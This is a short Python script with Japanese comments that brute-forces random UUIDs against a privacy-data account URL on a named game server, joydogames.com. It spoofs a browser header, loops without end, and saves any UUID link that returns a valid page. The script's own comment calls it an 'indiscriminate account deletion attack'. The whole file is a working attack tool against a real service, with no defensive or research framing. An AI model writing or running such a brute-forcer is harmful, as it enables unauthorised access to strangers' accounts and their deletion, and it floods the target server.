# import and Loading modules.
import uuid as uid
import requests
import random
from itertools import count, cycle, repeat
from colorama import Fore as f
import os
trynum = 0
success = 0
badnum = 0
ThreadCount = 0
TotalSendedShare = 0
TotalFailedReq = 0
DebugMode = False

#こんなプログラムがあるよ!!
def brute():
#グラデの色を決めるよ!!
    global trynum, TotalSendedShare, TotalFailedReq, DebugMode, success, badnum
    Red = random.randrange(200, 250, 2)
    Red2 = Red + random.randrange(11, 15, 2)
    Red3 = Red2 + random.randrange(11, 15, 2)
    Red4 = Red3 + random.randrange(11, 15, 2)
    Red5 = Red4 + random.randrange(11, 15, 2)
    Blue = random.randrange(200, 250, 2)
    Blue2 = Blue + random.randrange(11, 15, 2)
    Blue3 = Blue2 + random.randrange(11, 15, 2)
    Blue4 = Blue3 + random.randrange(11, 15, 2)
    Blue5 = Blue4 + random.randrange(11, 15, 2)
    Green = random.randrange(200, 250, 2)
    Green2 = Green + random.randrange(11, 23, 2)
    Green3 = Green2 + random.randrange(11, 23, 2)
    Green4 = Green3 + random.randrange(11, 23, 2)
    Green5 = Green4 + random.randrange(11, 23, 2)
    gurade = f"\x1b[38;2;{Red};{Green};{Blue}m"
    gurade2 = f"\x1b[38;2;{Red2};{Green2};{Blue2}m"
    gurade3 = f"\x1b[38;2;{Red3};{Green3};{Blue3}m"
    gurade4 = f"\x1b[38;2;{Red4};{Green4};{Blue4}m"
    gurade5 = f"\x1b[38;2;{Red5};{Green5};{Blue5}m"
# Generate a UUID
    uuid = str(uid.uuid4())
# Generate a Try Link.
    url = f"https://cnrfps2.joydogames.com:15443/web/account/privacy_data/{uuid}"
# Set a Header data.
    Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
# Trying Brute Indiscriminate account deletion Attack,
    send_data_url = requests.get(url, headers=Header)
    os.system(f"title Bruter is Now Working. - BadTry {badnum} - Success {success} - All {trynum}")
    trynum += 1
    if "invalid link." in str(send_data_url.content):

#失敗したら次のコードを実行するよ
        print(gurade + "[*] Attempting uuid: %s" % uuid)
        print(gurade2 + "[*] Tryed: %s" % trynum)
        badnum += 1
    if "Privacy Policy" in str(send_data_url.content):

#成功したらこのコードを実行するよ
        print(gurade4 + "[+] uuid is found: %s " % uuid)
        f = open('成功.txt', 'a', encoding='UTF-8')
        f.write(f'{url}\n')
        f.close()
        success += 1
        print(gurade5 + "[+] 成功パターンをファイルに保存しました。")

for num in count():
    brute()
